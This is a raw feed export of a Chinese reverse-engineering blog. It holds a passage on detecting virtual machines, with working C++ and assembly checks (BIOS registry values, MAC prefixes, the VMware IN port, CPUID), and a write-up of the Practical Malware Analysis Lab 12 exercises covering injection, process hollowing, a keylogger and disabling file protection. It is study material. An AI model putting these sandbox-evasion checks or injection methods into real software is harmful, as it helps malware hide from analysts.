class="hljs-comment">//打不开返回FALSE</span><br>&#125;<br><span class="hljs-keyword">return</span> TRUE;<span class="hljs-comment">//打开返回TRUE</span><br>&#125;<br></code></pre></div></td></tr></table></figure><p><img src="/2021/09/28/%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%A3%80%E6%B5%8B/4.png"></p><p>同时经过我测试发现，此表项也是vmtool的表项，如果卸载掉vmtool的话，此表项就不存在了。不过可用于判断的注册表项有许多，可以自己进行搜索并且实验来进行判断。我这里找到了如图的这个表项，应该是bios信息。那么可以根据这个来进行判断，比如查询SystemManufacturer中的值是否是<code>VMware, Inc.</code>来判断是否是虚拟机。</p><p><img src="/2021/09/28/%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%A3%80%E6%B5%8B/5.png"></p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function">BOOL <span class="hljs-title">CheckRegValue</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>HKEY hKey;<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">RegOpenKeyEx</span>(HKEY_LOCAL_MACHINE, <span class="hljs-string">L&quot;HARDWARE\\DESCRIPTION\\System\\BIOS&quot;</span>, <span class="hljs-number">0</span>, KEY_ALL_ACCESS, &amp;hKey) != ERROR_SUCCESS)<span class="hljs-comment">//打开注册表</span><br>&#123;<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br>DWORD dwType;<br>WCHAR data[<span class="hljs-number">100</span>];<br>DWORD len = <span class="hljs-number">100</span>;<br><span class="hljs-built_in">RegQueryValueEx</span>(hKey, <span class="hljs-string">L&quot;SystemManufacturer&quot;</span>, <span class="hljs-literal">NULL</span>, &amp;dwType, (BYTE*)data, &amp;len);<span class="hljs-comment">//查询键值</span><br><span class="hljs-built_in">RegCloseKey</span>(hKey);<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">wcscmp</span>(data, <span class="hljs-string">L&quot;VMware, Inc.&quot;</span>) == <span class="hljs-number">0</span>)<span class="hljs-comment">//判断键值是否相等</span><br>&#123;<br><span class="hljs-keyword">return</span> TRUE;<span class="hljs-comment">//相等返回TRUE，虚拟机环境</span><br>&#125;<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br></code></pre></div></td></tr></table></figure><p><img src="/2021/09/28/%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%A3%80%E6%B5%8B/6.png"></p><p>注册表里的信息非常的多，比如这里还有显卡的相对应信息，显卡名称，这也可以用来检测。具体的话，可以自己在虚拟机中的注册表内查找可以用于检测的特征。</p><p><img src="/2021/09/28/%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%A3%80%E6%B5%8B/7.png"></p><h2 id="MAC地址"><a href="#MAC地址" class="headerlink" title="MAC地址"></a>MAC地址</h2><p>虚拟机的MAC地址是有特定的特征的，比如它们都是固定的开头</p><blockquote><p>00:50:56:XX:XX:XX<br>00:1C:14:XX:XX:XX<br>00:0C:29:XX:XX:XX<br>00:05:69:XX:XX:XX</p></blockquote><p><img src="/2021/09/28/%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%A3%80%E6%B5%8B/8.png"></p><p>那么就可以通过判断当前系统的MAC地址的开头地址来判断是否处于虚拟机之中。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function">BOOL <span class="hljs-title">CheckMacAddr</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    ULONG ulSize = <span class="hljs-number">0</span>;<br>    PIP_ADAPTER_INFO pInfo = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-built_in">GetAdaptersInfo</span>(pInfo, &amp;ulSize);<span class="hljs-comment">//获取缓冲区大小</span><br>    pInfo = (PIP_ADAPTER_INFO)<span class="hljs-built_in">malloc</span>(ulSize);<br>    <span class="hljs-built_in">GetAdaptersInfo</span>(pInfo, &amp;ulSize);<span class="hljs-comment">//获取适配器信息</span><br>    <span class="hljs-keyword">if</span> ((pInfo-&gt;Address[<span class="hljs-number">0</span>] == <span class="hljs-number">0x00</span> &amp;&amp; pInfo-&gt;Address[<span class="hljs-number">1</span>] == <span class="hljs-number">0x50</span> &amp;&amp; pInfo-&gt;Address[<span class="hljs-number">2</span>] == <span class="hljs-number">0x56</span>) ||<br>        (pInfo-&gt;Address[<span class="hljs-number">0</span>] == <span class="hljs-number">0x00</span> &amp;&amp; pInfo-&gt;Address[<span class="hljs-number">1</span>] == <span class="hljs-number">0x1C</span> &amp;&amp; pInfo-&gt;Address[<span class="hljs-number">2</span>] == <span class="hljs-number">0x14</span>) ||<br>        (pInfo-&gt;Address[<span class="hljs-number">0</span>] == <span class="hljs-number">0x00</span> &amp;&amp; pInfo-&gt;Address[<span class="hljs-number">1</span>] == <span class="hljs-number">0x0C</span> &amp;&amp; pInfo-&gt;Address[<span class="hljs-number">2</span>] == <span class="hljs-number">0x29</span>) ||<br>        (pInfo-&gt;Address[<span class="hljs-number">0</span>] == <span class="hljs-number">0x00</span> &amp;&amp; pInfo-&gt;Address[<span class="hljs-number">1</span>] == <span class="hljs-number">0x05</span> &amp;&amp; pInfo-&gt;Address[<span class="hljs-number">2</span>] == <span class="hljs-number">0x69</span>))<span class="hljs-comment">//判断MAC地址前几位是否相同</span><br>    &#123;<br>        <span class="hljs-keyword">return</span> TRUE;<span class="hljs-comment">//相同返回TRUE</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> FALSE;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="特定的文件"><a href="#特定的文件" class="headerlink" title="特定的文件"></a>特定的文件</h2><p>在虚拟机中有一些驱动文件，可以通过查询这些文件是否存在来判断。</p><p><img src="/2021/09/28/%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%A3%80%E6%B5%8B/9.png"></p><p>也不仅仅是这些驱动的文件，可以通过自己的查找，用其他的一些文件来做特征。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function">BOOL <span class="hljs-title">IfFileExist</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* FilePath)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">if</span> (_access(FilePath, <span class="hljs-number">0</span>) == <span class="hljs-number">0</span>)<span class="hljs-comment">//判断文件是否存在,0代表仅检查是否存在</span><br>&#123;<br><span class="hljs-keyword">return</span> TRUE;<span class="hljs-comment">//存在返回TRUE</span><br>&#125;<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br></code></pre></div></td></tr></table></figure><p><img src="/2021/09/28/%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%A3%80%E6%B5%8B/10.png"></p><h2 id="网关检测"><a href="#网关检测" class="headerlink" title="网关检测"></a>网关检测</h2><p>一般虚拟机中的网关地址如果不进行修改的话，最后一位都是2，那么可以通过检测网关地址的最后一位是否是2，来进行判断当前运行的环境。</p><p><img src="/2021/09/28/%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%A3%80%E6%B5%8B/11.png"></p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function">BOOL <span class="hljs-title">CheckGateway</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    ULONG ulSize = <span class="hljs-number">0</span>;<br>    PIP_ADAPTER_INFO pInfo = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-built_in">GetAdaptersInfo</span>(pInfo, &amp;ulSize);<span class="hljs-comment">//获取缓冲区大小</span><br>    pInfo = (PIP_ADAPTER_INFO)<span class="hljs-built_in">malloc</span>(ulSize);<br>    <span class="hljs-built_in">GetAdaptersInfo</span>(pInfo, &amp;ulSize);<span class="hljs-comment">//获取适配器信息</span><br>    <span class="hljs-keyword">char</span> IP[<span class="hljs-number">100</span>];<br>    <span class="hljs-built_in">sprintf</span>(IP, <span class="hljs-string">&quot;%s&quot;</span>, pInfo-&gt;GatewayList.IpAddress.String);<span class="hljs-comment">//网关的信息</span><br>    <span class="hljs-keyword">int</span> len = <span class="hljs-built_in">strlen</span>(IP);<br>    <span class="hljs-keyword">char</span>* a = &amp;IP[len - <span class="hljs-number">1</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(<span class="hljs-string">&quot;2&quot;</span>, a) == <span class="hljs-number">0</span>)<span class="hljs-comment">//判断最后一位是否等于2</span><br>    &#123;<br>        <span class="hljs-keyword">return</span> TRUE;<span class="hljs-comment">//相等返回TRUE</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> FALSE;<br>&#125;<br></code></pre></div></td></tr></table></figure><p><img src="/2021/09/28/%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%A3%80%E6%B5%8B/12.png"></p><h2 id="特权指令"><a href="#特权指令" class="headerlink" title="特权指令"></a>特权指令</h2><p>Vmware为主机与虚拟机之间提供了相互沟通的通讯机制，它使用“IN”指令来读取特定端口的数据以进行两机通讯，但由于IN指令属于特权指令，在处于保护模式下的真机上执行此指令时，除非权限允许，否则将会触发类型为“EXCEPTION_PRIV_INSTRUCTION”的异常，而在虚拟机中并不会发生异常，在指定功能号0A（获取VMware版本）的情况下，它会在EBX中返回其版本号“VMXH”，可以通过此返回值判断是否处于虚拟机中。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function">BOOL <span class="hljs-title">CheckIN</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>BOOL flag = FALSE;<br>__try<br>&#123;<br>__asm <br>&#123;<br>pushad<br>mov eax,<span class="hljs-string">&#x27;VMXh&#x27;</span><br><span class="hljs-keyword">xor</span> ebx,ebx<br>mov ecx,<span class="hljs-number">0x0A</span><span class="hljs-comment">//功能号0x0A</span><br>mov edx,<span class="hljs-string">&#x27;VX&#x27;</span><br>in eax,dx<br>cmp ebx,<span class="hljs-string">&#x27;VMXh&#x27;</span><span class="hljs-comment">//判断返回值是否是VMXh</span><br>je _vm<span class="hljs-comment">//是的话返回TRUE</span><br>jmp _exit<br>_vm:<br>mov eax,TRUE<br>mov flag,eax<br>_exit:<br>popad<br>&#125;<br>&#125;<br>__except (EXCEPTION_EXECUTE_HANDLER)<br>&#123;<br>flag = FALSE;<br>&#125;<br><span class="hljs-keyword">return</span> flag;<br>&#125;<br></code></pre></div></td></tr></table></figure><p><img src="/2021/09/28/%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%A3%80%E6%B5%8B/13.png"></p><h2 id="CPUID"><a href="#CPUID" class="headerlink" title="CPUID"></a>CPUID</h2><p>当eax=1时，运行CPUID之后，ecx中的值（转为二进制）如果最高位为1，那么就是在虚拟环境，否则不是。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function">BOOL <span class="hljs-title">CPUID</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>BOOL flag;<br>__asm<br>&#123;<br>pushad<br>pushfd<br>mov eax,<span class="hljs-number">1</span><br>cpuid<br><span class="hljs-keyword">and</span> ecx,<span class="hljs-number">0x80000000</span><span class="hljs-comment">//只留最高位进行判断</span><br>test ecx,ecx<span class="hljs-comment">//判断ecx寄存器是否为空，为空代表非虚拟机环境返回FALSE，否则返回TRUE</span><br>jz _Not<br>mov flag,TRUE<br>jmp _end<br>_Not:<br>mov flag,FALSE<br>_end:<br>popfd<br>popad<br>&#125;<br><span class="hljs-keyword">return</span> flag;<br>&#125;<br></code></pre></div></td></tr></table></figure><p><img src="/2021/09/28/%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%A3%80%E6%B5%8B/15.png"></p><p>当eax中的值是0x40000000时，ebx、ecx、edx三个寄存器中的返回值加起来正好是“VMWareVMWare”，可以把这个程序拖入OD，直接进行修改来查看。</p><p><img src="/2021/09/28/%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%A3%80%E6%B5%8B/14.png"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>总结了一些可以使用的虚拟机检测的方式，但是感觉还是比较片面的，其中一些检测的特征也可以通过手动的方式来进行修改。</p><p>感觉反虚拟机还是游戏方面做的更好一些，如果能把网游反虚拟机的机制学习清楚的话应该还能学到更多的东西。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="http://blog.nsfocus.net/malicious-sample-analysis-manual-virtual-machine-test-bottom/">http://blog.nsfocus.net/malicious-sample-analysis-manual-virtual-machine-test-bottom/</a></p><p><a href="https://www.freebuf.com/articles/system/202717.html">https://www.freebuf.com/articles/system/202717.html</a></p><p><a href="https://www.write-bug.com/article/1822.html">https://www.write-bug.com/article/1822.html</a></p><p><a href="https://bbs.pediy.com/thread-219955.htm">https://bbs.pediy.com/thread-219955.htm</a></p>]]></content>
    
    
    <categories>
      
      <category>虚拟机检测</category>
      
    </categories>
    
    
    <tags>
      
      <tag>逆向工程</tag>
      
      <tag>虚拟机检测</tag>
      
      <tag>编程</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>恶意代码分析实战-实验12</title>
    <link href="/2021/09/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C12/"/>
    <url>/2021/09/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C12/</url>
    
    <content type="html"><![CDATA[<h2 id="Lab-12-1"><a href="#Lab-12-1" class="headerlink" title="Lab 12-1"></a>Lab 12-1</h2><h3 id="详细分析"><a href="#详细分析" class="headerlink" title="详细分析"></a>详细分析</h3><p>打开程序后，每隔一段时间都会弹出一个窗口</p><p><img src="/2021/09/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C12/1-1.png"></p><p>使用火绒剑监控行为，发现其有注入的行为。可以看到注入的进程是Explorer.exe</p><p><img src="/2021/09/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C12/1-2.png"></p><p><img src="/2021/09/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C12/1-3.png"></p><p>可以看出来它获取了explorer的PID然后进行了DLL注入，注入的DLL为Lab12-01.dll。它获得进程PID的方式是通过EnumProcesses、EnumProcessModules、GetModuleBaseNameA这三个函数实现的。首先通过EnumProcesses获得所有进程的PID，然后打开每个进程，再通过EnumProcessModules、GetModuleBaseNameA获取进程名字，再和explorer.exe进行比较判断。</p><p><img src="/2021/09/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C12/1-4.png"></p><p><img src="/2021/09/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C12/1-5.png"></p><p>现在来分析一下注入的DLL文件，DLLMAIN中创建了一个新的线程。</p><p><img src="/2021/09/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C12/1-6.png"></p><p>新的线程，会拼接一个字符串，也就是前面弹出窗口的标题的次数，会无限制的增长，那么创建的这个新线程应该就是弹窗函数了，进去看果然如此，最后调用sleep函数。</p><p><img src="/2021/09/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C12/1-7.png"></p><p><img src="/2021/09/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C12/1-8.png"></p><h3 id="1-在你运行恶意代码可执行文件时，会发生什么？"><a href="#1-在你运行恶意代码可执行文件时，会发生什么？" class="headerlink" title="1.在你运行恶意代码可执行文件时，会发生什么？"></a>1.在你运行恶意代码可执行文件时，会发生什么？</h3><p>会将Lab12-01.dll注入到explorer.exe中，然后每隔一分钟弹出一个窗口。</p><h3 id="2-哪个进程会被注入"><a href="#2-哪个进程会被注入" class="headerlink" title="2.哪个进程会被注入"></a>2.哪个进程会被注入</h3><p>explorer.exe</p><h3 id="3-你如何能够让恶意代码停止弹出窗口"><a href="#3-你如何能够让恶意代码停止弹出窗口" class="headerlink" title="3.你如何能够让恶意代码停止弹出窗口"></a>3.你如何能够让恶意代码停止弹出窗口</h3><p>重新启动explorer.exe</p><h3 id="4-这个恶意代码样本是如何工作的？"><a href="#4-这个恶意代码样本是如何工作的？" class="headerlink" title="4.这个恶意代码样本是如何工作的？"></a>4.这个恶意代码样本是如何工作的？</h3><p>它会进行远程线程注入将Lab12-01.dll注入到explorer.exe中，然后每分钟都会弹出一个窗口。</p><h2 id="Lab-12-2"><a href="#Lab-12-2" class="headerlink" title="Lab 12-2"></a>Lab 12-2</h2><h3 id="详细分析-1"><a href="#详细分析-1" class="headerlink" title="详细分析"></a>详细分析</h3><p>看到Main函数流程较短</p><p><img src="/2021/09/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C12/2-1.png"></p><p>首先获得了svchost.exe的路径</p><p><img src="/2021/09/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C12/2-2.png"></p><p>然后是从资源节读取了数据，然后有判断，如果开头不是MZ的话，会调用<code>401000</code>函数。</p><p><img src="/2021/09/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C12/2-3.png"></p><p>进入查看，可以看到是一个异或解密，那么这个资源节中的数据是异或0x41进行加密。</p><p><img src="/2021/09/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C12/2-4.png"></p><p>之后就是一个傀儡进程的创建，将shellcode注入到svchost.exe中</p><p><img src="/2021/09/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C12/2-5.png"></p><p><img src="/2021/09/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C12/2-6.png"></p><p>把shellcodedump出来分析一下，发现是一个键盘记录的程序</p><p><img src="/2021/09/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C12/2-7.png"></p><p>查看挂钩函数fn</p><p><img src="/2021/09/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C12/2-8.png"></p><p>记录键盘输入内容</p><p><img src="/2021/09/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C12/2-9.png"></p><h3 id="1-这个程序的目的是什么？"><a href="#1-这个程序的目的是什么？" class="headerlink" title="1.这个程序的目的是什么？"></a>1.这个程序的目的是什么？</h3><p>注入shellcode到svchost.exe，实现键盘钩子</p><h3 id="2-启动器恶意代码是如何隐蔽执行的？"><a href="#2-启动器恶意代码是如何隐蔽执行的？" class="headerlink" title="2.启动器恶意代码是如何隐蔽执行的？"></a>2.启动器恶意代码是如何隐蔽执行的？</h3><p>将shellcode注入到svchost.exe，实现了一个傀儡进程。</p><h3 id="3-恶意代码的负载存储在哪里？"><a href="#3-恶意代码的负载存储在哪里？" class="headerlink" title="3.恶意代码的负载存储在哪里？"></a>3.恶意代码的负载存储在哪里？</h3><p>存储在资源节之中</p><h3 id="4-恶意负载是如何被保护的？"><a href="#4-恶意负载是如何被保护的？" class="headerlink" title="4.恶意负载是如何被保护的？"></a>4.恶意负载是如何被保护的？</h3><p>与0x41异或加密了</p><h3 id="5-字符串列表是如何被保护的？"><a href="#5-字符串列表是如何被保护的？" class="headerlink" title="5.字符串列表是如何被保护的？"></a>5.字符串列表是如何被保护的？</h3><p>这个问题我没看懂，看了书上的答案，书上说是<code>401000</code>处函数，进行XOR编码。那个函数实际上就是解密shellcode的函数。所以它的意思应该是，shellcode中的字符串是如何被保护的。</p><h2 id="Lab-12-3"><a href="#Lab-12-3" class="headerlink" title="Lab 12-3"></a>Lab 12-3</h2><p>这就是Lab 12-2中的shellcode，刚才已经详细分析过了，就不再进行分析了。</p><h3 id="1-这个恶意负载的目的是什么？"><a href="#1-这个恶意负载的目的是什么？" class="headerlink" title="1.这个恶意负载的目的是什么？"></a>1.这个恶意负载的目的是什么？</h3><p>键盘记录</p><h3 id="2-恶意负载是如何注入自身的？"><a href="#2-恶意负载是如何注入自身的？" class="headerlink" title="2.恶意负载是如何注入自身的？"></a>2.恶意负载是如何注入自身的？</h3><p>这个我也没看懂，没明白什么叫注入自身，因为没看到注入行为，看了书上的答案，意思是</p><blockquote><p>挂钩注入，来偷取击键记录</p></blockquote><p>原来是这样，好吧…</p><h3 id="3-这个恶意程序还创建了哪些其他文件？"><a href="#3-这个恶意程序还创建了哪些其他文件？" class="headerlink" title="3.这个恶意程序还创建了哪些其他文件？"></a>3.这个恶意程序还创建了哪些其他文件？</h3><p>创建了practicalmalwareanalysis.log文件，来记录。</p><p><img src="/2021/09/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C12/3-1.png"></p><h2 id="Lab-12-4"><a href="#Lab-12-4" class="headerlink" title="Lab 12-4"></a>Lab 12-4</h2><h3 id="详细分析-2"><a href="#详细分析-2" class="headerlink" title="详细分析"></a>详细分析</h3><p>打开发现其前部分与Lab12-1是一致的，就不再进行分析饿了，只是在<code>401000</code>中是winlogon.exe，也就是前面这部分是获取winlogon.exe的PID</p><p><img src="/2021/09/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C12/4-1.png"></p><p><img src="/2021/09/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C12/4-2.png"></p><p>现在来分析一下后面的部分</p><p><img src="/2021/09/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C12/4-3.png"></p><p>首先是进行了提权，判断是否有SeDebugPrivilege权限，如果没有的话会进行提权。</p><p><img src="/2021/09/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C12/4-4.png"></p><p>然后会进行远程线程注入，注入函数是sfc_os.dll中的序号为2的函数，</p><p><img src="/2021/09/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C12/4-5.png"></p><p>然后会移动文件</p><p><img src="/2021/09/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C12/4-6.png"></p><p>最后是一个资源释放，释放到C:\Windows\system32\wupdmgr.exe，并且隐藏窗口启动它。</p><p><img src="/2021/09/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C12/4-7.png"></p><p>把资源节中的程序dump下来分析，首先看到启动了winup.exe也就是原始的wupdmgr.exe，然后会访问<a href="http://www.practicalmalwareanalysis.com/updater.exe">http://www.practicalmalwareanalysis.com/updater.exe</a> ，进行下载更新恶意代码。</p><p><img src="/2021/09/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C12/4-8.png"></p><h3 id="1-位置0x401000的代码完成了什么功能"><a href="#1-位置0x401000的代码完成了什么功能" class="headerlink" title="1.位置0x401000的代码完成了什么功能"></a>1.位置0x401000的代码完成了什么功能</h3><p>判断当前进程的PID是否是winlogon.exe</p><p><img src="/2021/09/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C12/4-2.png"></p><h3 id="2-代码注入了哪些进程？"><a href="#2-代码注入了哪些进程？" class="headerlink" title="2.代码注入了哪些进程？"></a>2.代码注入了哪些进程？</h3><p>winlogon.exe</p><h3 id="3-使用LoadLibraryA装载了哪个DLL程序？"><a href="#3-使用LoadLibraryA装载了哪个DLL程序？" class="headerlink" title="3.使用LoadLibraryA装载了哪个DLL程序？"></a>3.使用LoadLibraryA装载了哪个DLL程序？</h3><p>sfc_os.dll</p><h3 id="4-传递给CreateRemoteThread调用的第四个参数是什么？"><a href="#4-传递给CreateRemoteThread调用的第四个参数是什么？" class="headerlink" title="4.传递给CreateRemoteThread调用的第四个参数是什么？"></a>4.传递给CreateRemoteThread调用的第四个参数是什么？</h3><p>sfc_os.dll中的序号为2的函数，是一个名为SfcTerminateWatcherThread的函数，用来关闭windows的文件保护。</p><h3 id="5-二进制主程序释放出了哪个恶意代码？"><a href="#5-二进制主程序释放出了哪个恶意代码？" class="headerlink" title="5.二进制主程序释放出了哪个恶意代码？"></a>5.二进制主程序释放出了哪个恶意代码？</h3><p>wupdmgr.exe，原始的wupdmgr.exe被放到了temp目录下，重命名为了winup.exe</p><h3 id="6-释放出恶意代码的目的是什么？"><a href="#6-释放出恶意代码的目的是什么？" class="headerlink" 